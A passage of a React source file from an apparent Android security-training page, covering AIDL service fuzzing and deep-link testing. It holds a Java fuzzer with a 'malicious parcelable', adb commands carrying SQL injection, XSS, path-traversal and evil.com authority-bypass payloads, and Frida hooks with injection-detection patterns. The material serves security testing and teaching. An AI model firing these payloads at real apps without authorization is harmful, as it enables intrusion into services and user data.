                <h4 className="text-lg font-medium text-cybr-secondary">AIDL Interface Discovery</h4>
                <CodeExample
                  language="bash"
                  title="AIDL Security Analysis"
                  code={`# Find AIDL files in decompiled app
find ./decompiled_app -name "*.aidl" -type f

# Analyze AIDL interface definitions
cat ./decompiled_app/src/com/example/app/ISecureService.aidl

# Look for AIDL-generated Java files
find ./decompiled_app -name "*\$Stub.java" -type f
find ./decompiled_app -name "*\$Proxy.java" -type f

# Search for Binder implementations
grep -r "extends.*Binder" ./decompiled_app/
grep -r "implements.*Interface" ./decompiled_app/

# Check for AIDL service registration
grep -r "addService\\|getService" ./decompiled_app/
grep -r "ServiceManager" ./decompiled_app/

# Analyze AIDL method signatures
grep -A 10 -B 5 "onTransact" ./decompiled_app/src/com/example/app/*Stub.java

# Look for custom parcelable objects
find ./decompiled_app -name "*Parcelable*.java"
grep -r "writeToParcel\\|createFromParcel" ./decompiled_app/

# Check for AIDL permissions
grep -r "checkPermission\\|enforcePermission" ./decompiled_app/
grep -r "Binder.getCallingUid\\|Binder.getCallingPid" ./decompiled_app/`}
                />

                <h4 className="text-lg font-medium text-cybr-secondary">AIDL Fuzzing Framework</h4>
                <CodeExample
                  language="java"
                  title="AIDL Security Testing Framework"
                  code={`// AIDL Security Testing Framework
public class AIDLSecurityTester {
    private static final String TAG = "AIDLSecurityTester";
    
    public static void testAIDLInterface(Context context, String serviceName) {
        try {
            // Get the service
            IBinder service = ServiceManager.getService(serviceName);
            if (service == null) {
                Log.e(TAG, "Service not found: " + serviceName);
                return;
            }
            
            Log.i(TAG, "Testing AIDL service: " + serviceName);
            
            // Test basic connectivity
            testBasicConnectivity(service);
            
            // Fuzz AIDL methods
            fuzzAIDLMethods(service);
            
            // Test permission bypass
            testPermissionBypass(service);
            
            // Test malicious parcelables
            testMaliciousParcelables(service);
            
        } catch (Exception e) {
            Log.e(TAG, "Error testing AIDL service", e);
        }
    }
    
    private static void testBasicConnectivity(IBinder service) {
        try {
            // Test if service is alive
            boolean alive = service.isBinderAlive();
            Log.i(TAG, "Service alive: " + alive);
            
            // Get interface descriptor
            String descriptor = service.getInterfaceDescriptor();
            Log.i(TAG, "Interface descriptor: " + descriptor);
            
            // Test ping
            service.pingBinder();
            Log.i(TAG, "Service ping successful");
            
        } catch (Exception e) {
            Log.e(TAG, "Basic connectivity test failed", e);
        }
    }
    
    private static void fuzzAIDLMethods(IBinder service) {
        Log.i(TAG, "Starting AIDL method fuzzing");
        
        // Common AIDL transaction codes to test
        int[] transactionCodes = {
            1, 2, 3, 4, 5, 10, 100, 1000,
            Integer.MAX_VALUE, Integer.MIN_VALUE,
            0xDEADBEEF, 0x12345678
        };
        
        for (int code : transactionCodes) {
            testTransactionCode(service, code);
        }
        
        // Test with malformed data
        testMalformedData(service);
    }
    
    private static void testTransactionCode(IBinder service, int code) {
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            
            try {
                // Write interface token (required for most AIDL calls)
                data.writeInterfaceToken(service.getInterfaceDescriptor());
                
                // Test with various data types
                data.writeString("test_string");
                data.writeInt(12345);
                data.writeLong(123456789L);
                data.writeFloat(3.14f);
                data.writeDouble(3.14159);
                data.writeByte((byte) 0xFF);
                
                // Attempt transaction
                boolean result = service.transact(code, data, reply, 0);
                
                if (result) {
                    Log.i(TAG, "Transaction " + code + " succeeded");
                    
                    // Try to read reply
                    try {
                        reply.setDataPosition(0);
                        int replyInt = reply.readInt();
                        Log.i(TAG, "Reply data: " + replyInt);
                    } catch (Exception e) {
                        // Reply might not contain expected data
                    }
                } else {
                    Log.d(TAG, "Transaction " + code + " failed");
                }
                
            } finally {
                data.recycle();
                reply.recycle();
            }
            
        } catch (SecurityException se) {
            Log.w(TAG, "Transaction " + code + " blocked by security: " + se.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Transaction " + code + " error: " + e.getMessage());
        }
    }
    
    private static void testMalformedData(IBinder service) {
        Log.i(TAG, "Testing malformed data");
        
        try {
            String descriptor = service.getInterfaceDescriptor();
            
            // Test with oversized strings
            testOversizedString(service, descriptor);
            
            // Test with negative values
            testNegativeValues(service, descriptor);
            
            // Test with null data
            testNullData(service, descriptor);
            
            // Test with corrupted parcels
            testCorruptedParcels(service, descriptor);
            
        } catch (Exception e) {
            Log.e(TAG, "Malformed data test error", e);
        }
    }
    
    private static void testOversizedString(IBinder service, String descriptor) {
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            
            try {
                data.writeInterfaceToken(descriptor);
                
                // Create oversized string (10MB)
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 10 * 1024 * 1024; i++) {
                    sb.append("A");
                }
                data.writeString(sb.toString());
                
                service.transact(1, data, reply, 0);
                Log.i(TAG, "Oversized string test - no crash");
                
            } finally {
                data.recycle();
                reply.recycle();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Oversized string test failed", e);
        }
    }
    
    private static void testNegativeValues(IBinder service, String descriptor) {
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            
            try {
                data.writeInterfaceToken(descriptor);
                data.writeInt(-1);
                data.writeLong(-1L);
                data.writeFloat(-1.0f);
                data.writeDouble(-1.0);
                
                service.transact(1, data, reply, 0);
                Log.i(TAG, "Negative values test completed");
                
            } finally {
                data.recycle();
                reply.recycle();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Negative values test failed", e);
        }
    }
    
    private static void testNullData(IBinder service, String descriptor) {
        try {
            // Test with null parcel (should fail gracefully)
            service.transact(1, null, null, 0);
            Log.w(TAG, "Service accepted null parcel - potential vulnerability");
            
        } catch (Exception e) {
            Log.i(TAG, "Service properly rejected null parcel");
        }
    }
    
    private static void testCorruptedParcels(IBinder service, String descriptor) {
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            
            try {
                // Create deliberately corrupted parcel
                data.writeInterfaceToken(descriptor);
                data.writeInt(100); // Claim to write 100 strings
                data.writeString("only_one_string"); // But only write one
                
                service.transact(1, data, reply, 0);
                Log.w(TAG, "Service processed corrupted parcel");
                
            } finally {
                data.recycle();
                reply.recycle();
            }
            
        } catch (Exception e) {
            Log.i(TAG, "Service properly handled corrupted parcel");
        }
    }
    
    private static void testPermissionBypass(IBinder service) {
        Log.i(TAG, "Testing permission bypass");
        
        try {
            // Test common bypass techniques
            testUidSpoofing(service);
            testPidSpoofing(service); 
            testBroadcastInterception(service);
            
        } catch (Exception e) {
            Log.e(TAG, "Permission bypass test error", e);
        }
    }
    
    private static void testUidSpoofing(IBinder service) {
        // Note: This is for educational/testing purposes only
        // Real UID spoofing requires root or system privileges
        
        try {
            String descriptor = service.getInterfaceDescriptor();
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            
            try {
                data.writeInterfaceToken(descriptor);
                
                // Some services might check calling UID
                // Test if service properly validates caller identity
                Log.i(TAG, "Current UID: " + android.os.Process.myUid());
                Log.i(TAG, "Current PID: " + android.os.Process.myPid());
                
                boolean result = service.transact(1, data, reply, 0);
                Log.i(TAG, "UID spoof test result: " + result);
                
            } finally {
                data.recycle();
                reply.recycle();
            }
            
        } catch (Exception e) {
            Log.e(TAG, "UID spoofing test failed", e);
        }
    }
    
    private static void testPidSpoofing(IBinder service) {
        // Similar to UID spoofing - testing service validation
        Log.i(TAG, "Testing PID validation");
        // Implementation would depend on specific service requirements
    }
    
    private static void testBroadcastInterception(IBinder service) {
        // Test if service can be tricked by fake broadcasts
        Log.i(TAG, "Testing broadcast interception resistance");
        // Implementation would involve sending fake system broadcasts
    }
    
    private static void testMaliciousParcelables(IBinder service) {
        Log.i(TAG, "Testing malicious parcelables");
        
        // This would involve creating custom Parcelable objects
        // with malicious data to test service deserialization
        
        try {
            MaliciousParcelable malicious = new MaliciousParcelable();
            
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            
            try {
                data.writeInterfaceToken(service.getInterfaceDescriptor());
                malicious.writeToParcel(data, 0);
                
                service.transact(1, data, reply, 0);
                Log.w(TAG, "Service processed malicious parcelable");
                
            } finally {
                data.recycle();
                reply.recycle();
            }
            
        } catch (Exception e) {
            Log.i(TAG, "Service rejected malicious parcelable: " + e.getMessage());
        }
    }
    
    // Example malicious parcelable for testing
    private static class MaliciousParcelable implements Parcelable {
        @Override
        public void writeToParcel(Parcel dest, int flags) {
            // Write malicious data
            dest.writeString("../../../etc/passwd");
            dest.writeInt(Integer.MAX_VALUE);
            dest.writeLong(Long.MAX_VALUE);
            
            // Try to cause buffer overflow
            byte[] largeArray = new byte[1024 * 1024]; // 1MB
            Arrays.fill(largeArray, (byte) 0xFF);
            dest.writeByteArray(largeArray);
        }
        
        @Override
        public int describeContents() {
            return 0;
        }
        
        public static final Creator<MaliciousParcelable> CREATOR = new Creator<MaliciousParcelable>() {
            @Override
            public MaliciousParcelable createFromParcel(Parcel in) {
                return new MaliciousParcelable();
            }
            
            @Override
            public MaliciousParcelable[] newArray(int size) {
                return new MaliciousParcelable[size];
            }
        };
    }
}`}
                />
              </div>
            </TabsContent>

            <TabsContent value="deep-links" className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Deep Link Security Analysis</h3>
              <p className="text-cybr-foreground/80 mb-4">
                Deep links and App Links provide direct access to application functionality but can be exploited 
                for unauthorized access, data manipulation, and privilege escalation. This analysis covers URL 
                scheme hijacking, parameter injection, and deep link validation bypasses.
              </p>

              <div className="space-y-4">
                <h4 className="text-lg font-medium text-cybr-secondary">Deep Link Enumeration and Testing</h4>
                <CodeExample
                  language="bash"
                  title="Comprehensive Deep Link Security Testing"
                  code={`# Find deep link configurations in AndroidManifest.xml
grep -A 10 -B 5 "intent-filter" AndroidManifest.xml
grep -A 5 "data android:scheme" AndroidManifest.xml
grep -A 5 "android:autoVerify" AndroidManifest.xml

# Extract all URL schemes
grep -o 'android:scheme="[^"]*"' AndroidManifest.xml | sort -u

# Test basic deep links
adb shell am start -a android.intent.action.VIEW -d "myapp://home"
adb shell am start -a android.intent.action.VIEW -d "myapp://profile/123"
adb shell am start -a android.intent.action.VIEW -d "myapp://settings"

# Parameter injection attacks
adb shell am start -a android.intent.action.VIEW -d "myapp://user?id=1' OR '1'='1"
adb shell am start -a android.intent.action.VIEW -d "myapp://file?path=../../../etc/passwd"
adb shell am start -a android.intent.action.VIEW -d "myapp://web?url=javascript:alert('XSS')"

# Path traversal attacks
adb shell am start -a android.intent.action.VIEW -d "myapp://load/../../../sensitive/data"
adb shell am start -a android.intent.action.VIEW -d "myapp://file/..%2F..%2F..%2Fetc%2Fpasswd"

# Authority bypass attempts
adb shell am start -a android.intent.action.VIEW -d "myapp://admin@evil.com/sensitive"
adb shell am start -a android.intent.action.VIEW -d "myapp://user:pass@localhost/admin"

# Protocol confusion attacks
adb shell am start -a android.intent.action.VIEW -d "http://myapp/redirect"
adb shell am start -a android.intent.action.VIEW -d "https://myapp.evil.com/phishing"

# Fragment injection
adb shell am start -a android.intent.action.VIEW -d "myapp://page#javascript:alert('XSS')"
adb shell am start -a android.intent.action.VIEW -d "myapp://view#../admin/delete"

# Parameter pollution
adb shell am start -a android.intent.action.VIEW -d "myapp://user?id=1&id=2&admin=true"

# Encoding bypass attempts
adb shell am start -a android.intent.action.VIEW -d "myapp://user?data=%2e%2e%2f%2e%2e%2fadmin"
adb shell am start -a android.intent.action.VIEW -d "myapp://page?url=file%3a%2f%2f%2fetc%2fpasswd"

# Long parameter attacks
adb shell am start -a android.intent.action.VIEW -d "myapp://test?data=$(python -c 'print("A"*10000)')"

# Null byte injection (URL encoded)
adb shell am start -a android.intent.action.VIEW -d "myapp://file?name=safe.txt%00../../etc/passwd"

# App Link verification bypass
adb shell am start -a android.intent.action.VIEW -d "https://app.example.com/.well-known/assetlinks.json"

# Test universal links (iOS-style) if supported
adb shell am start -a android.intent.action.VIEW -d "https://example.com/app/profile/123"

# Custom scheme collision testing
adb shell am start -a android.intent.action.VIEW -d "http://myapp"
adb shell am start -a android.intent.action.VIEW -d "https://myapp"`}
                />

                <h4 className="text-lg font-medium text-cybr-secondary">Deep Link Security Monitoring</h4>
                <CodeExample
                  language="javascript"
                  title="Deep Link Security Analysis with Frida"
                  code={`Java.perform(function() {
    console.log("[+] Deep Link Security Monitoring Started");
    
    // Hook Activity.onCreate() to catch deep link handling
    var Activity = Java.use("android.app.Activity");
    Activity.onCreate.overload('android.os.Bundle').implementation = function(savedInstanceState) {
        console.log("[+] Activity.onCreate() called: " + this.getClass().getName());
        
        // Check if activity was started by Intent
        var intent = this.getIntent();
        if (intent) {
            this.analyzeDeepLinkIntent(intent);
        }
        
        return this.onCreate(savedInstanceState);
    };
    
    // Hook Activity.onNewIntent() for single-task activities
    Activity.onNewIntent.implementation = function(intent) {
        console.log("[+] Activity.onNewIntent() called: " + this.getClass().getName());
        
        if (intent) {
            this.analyzeDeepLinkIntent(intent);
        }
        
        return this.onNewIntent(intent);
    };
    
    // Hook Uri parsing methods
    var Uri = Java.use("android.net.Uri");
    Uri.parse.implementation = function(uriString) {
        console.log("[+] Uri.parse() called");
        console.log("    URI: " + uriString);
        
        // Check for suspicious patterns
        if (this.containsSuspiciousPatterns(uriString)) {
            console.log("[!] SUSPICIOUS URI PATTERN DETECTED");
        }
        
        var uri = this.parse(uriString);
        
        // Analyze parsed URI
        if (uri) {
            this.analyzeUri(uri);
        }
        
        return uri;
    };
    
    // Hook common URI extraction methods
    var UriClass = Java.use("android.net.Uri");
    UriClass.getQueryParameter.implementation = function(key) {
        var value = this.getQueryParameter(key);
        console.log("[+] Uri.getQueryParameter()");
        console.log("    Key: " + key);
        console.log("    Value: " + value);
        
        // Check for injection patterns
        if (value && this.containsInjectionPatterns(value)) {
            console.log("[!] POTENTIAL INJECTION IN QUERY PARAMETER");
        }
        
        return value;
    };
    
    UriClass.getPath.implementation = function() {
        var path = this.getPath();
        console.log("[+] Uri.getPath(): " + path);
        
        // Check for path traversal
        if (path && (path.includes("../") || path.includes("..\\") || path.includes("%2e%2e"))) {
            console.log("[!] POTENTIAL PATH TRAVERSAL IN URI PATH");
        }
        
        return path;
    };
    
    // Hook WebView URL loading (common deep link target)
    try {
        var WebView = Java.use("android.webkit.WebView");
        WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
            console.log("[+] WebView.loadUrl() called");
            console.log("    URL: " + url);
            
            // Check for dangerous URLs from deep links
            if (url.startsWith("javascript:") || 
                url.startsWith("data:") || 
                url.startsWith("file://")) {
                console.log("[!] DANGEROUS URL LOADED IN WEBVIEW FROM DEEP LINK");
            }
            
            return this.loadUrl(url);
        };
    } catch(e) {
        console.log("[-] WebView hooking failed: " + e);
    }
    
    // Helper function to analyze deep link intents
    Activity.analyzeDeepLinkIntent = function(intent) {
        try {
            var action = intent.getAction();
            var data = intent.getData();
            var extras = intent.getExtras();
            
            console.log("  Deep Link Analysis:");
            console.log("    Action: " + action);
            
            if (data) {
                console.log("    Data URI: " + data.toString());
                console.log("    Scheme: " + data.getScheme());
                console.log("    Host: " + data.getHost());
                console.log("    Path: " + data.getPath());
                console.log("    Query: " + data.getQuery());
                console.log("    Fragment: " + data.getFragment());
                
                // Security checks
                this.performDeepLinkSecurityChecks(data);
            }
            
            if (extras) {
                console.log("    Intent Extras:");
                var keySet = extras.keySet();
                var iterator = keySet.iterator();
                
                while (iterator.hasNext()) {
                    var key = iterator.next();
                    try {
                        var value = extras.get(key);
                        console.log("      " + key + " = " + value);
                    } catch(e) {
                        console.log("      " + key + " = <complex object>");
                    }
                }
            }
            
        } catch(e) {
            console.log("[-] Error analyzing deep link intent: " + e);
        }
    };
    
    // Helper function to perform security checks on URIs
    Activity.performDeepLinkSecurityChecks = Uri.performDeepLinkSecurityChecks = function(uri) {
        try {
            var uriString = uri.toString();
            
            // Check for path traversal
            if (uriString.includes("../") || uriString.includes("..\\\\")) {
                console.log("[!] PATH TRAVERSAL DETECTED IN DEEP LINK");
            }
            
            // Check for protocol confusion
            var scheme = uri.getScheme();
            if (scheme && !scheme.startsWith("http") && scheme.includes("http")) {
                console.log("[!] POTENTIAL PROTOCOL CONFUSION ATTACK");
            }
            
            // Check for JavaScript injection
            if (uriString.toLowerCase().includes("javascript:")) {
                console.log("[!] JAVASCRIPT INJECTION ATTEMPT IN DEEP LINK");
            }
            
            // Check for file:// access
            if (scheme && scheme.equals("file")) {
                console.log("[!] FILE PROTOCOL ACCESS VIA DEEP LINK");
            }
            
            // Check for encoded attacks
            if (uriString.includes("%2e%2e") || uriString.includes("%2f%2f")) {
                console.log("[!] ENCODED ATTACK PATTERN IN DEEP LINK");
            }
            
            // Check query parameters for injection
            var query = uri.getQuery();
            if (query) {
                if (query.includes("'") || query.includes("\"") || 
                    query.includes("<") || query.includes(">")) {
                    console.log("[!] POTENTIAL INJECTION IN QUERY PARAMETERS");
                }
            }
            
            // Check for admin/sensitive paths
            var path = uri.getPath();
            if (path) {
                var sensitivePaths = ["admin", "config", "settings", "debug", "test"];
                for (var i = 0; i < sensitivePaths.length; i++) {
                    if (path.toLowerCase().includes(sensitivePaths[i])) {
                        console.log("[!] ACCESS TO SENSITIVE PATH VIA DEEP LINK: " + sensitivePaths[i]);
                    }
                }
            }
            
        } catch(e) {
            console.log("[-] Error in deep link security checks: " + e);
        }
    };
    
    // Helper function to check for suspicious URI patterns
    Uri.containsSuspiciousPatterns = function(uriString) {
        var suspiciousPatterns = [
            /javascript:/i,
            /data:/i,
            /file:\/\/\//i,
            /\.\.\/\.\.\//,
            /%2e%2e/i,
            /admin|config|debug|test/i,
            /'|"|<|>/
        ];
        
        for (var i = 0; i < suspiciousPatterns.length; i++) {
            if (suspiciousPatterns[i].test(uriString)) {
                return true;
            }
        }
        return false;
    };
    
    // Helper function to check for injection patterns
    UriClass.containsInjectionPatterns = function(value) {
        var injectionPatterns = [
            /'\\s*(or|and)\\s*'\\s*=\\s*'/i,  // SQL injection
            /<script/i,                       // XSS
            /javascript:/i,                   // JavaScript injection
            /\\.\\.[\\/\\\\]/,                 // Path traversal
            /%2e%2e/i,                       // Encoded path traversal
            /\\${.*}/,                       // Template injection
        ];
        
        for (var i = 0; i < injectionPatterns.length; i++) {
            if (injectionPatterns[i].test(value)) {
                return true;
            }
        }
        return false;
    };
    
    // Helper function to analyze URI components
    Uri.analyzeUri = function(uri) {
        try {
            console.log("  URI Analysis:");
            console.log("    Authority: " + uri.getAuthority());
            console.log("    UserInfo: " + uri.getUserInfo());
            console.log("    Port: " + uri.getPort());
            
            // Check for dangerous authority patterns
            var authority = uri.getAuthority();
            if (authority && (authority.includes("@") || authority.includes(":"))) {
                console.log("[!] SUSPICIOUS AUTHORITY PATTERN - POSSIBLE ATTACK");
            }
            
        } catch(e) {
            console.log("[-] Error analyzing URI: " + e);
        }
    };
});`}
                />
              </div>
            </TabsContent>
          </Tabs>

          <div className="mt-6 p-4 bg-cybr-muted/20 rounded-lg">
            <h4 className="font-medium text-cybr-accent mb-2">Android IPC Security Best Practices</h4>
            <ul className="list-disc pl-6 space-y-1 text-sm">
              <li><strong>Intent Security</strong>: Use explicit intents, validate all intent extras, implement proper data sanitization</li>
              <li><strong>Content Providers</strong>: Implement proper SQL injection prevention, use parameterized queries, validate URI paths</li>
              <li><strong>Broadcast Receivers</strong>: Use local broadcasts when possible, implement permission requirements, validate broadcast data</li>
              <li><strong>Service Security</strong>: Implement proper authentication, validate service inputs, use bound services with permissions</li>
              <li><strong>AIDL Interfaces</strong>: Implement caller validation, use proper exception handling, validate parcelable objects</li>
              <li><strong>Deep Links</strong>: Validate all URL parameters, implement proper input sanitization, use App Links verification</li>
              <li><strong>General IPC</strong>: Follow principle of least privilege, implement defense in depth, log security events</li>
            </ul>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default AndroidIPCAnalysis;
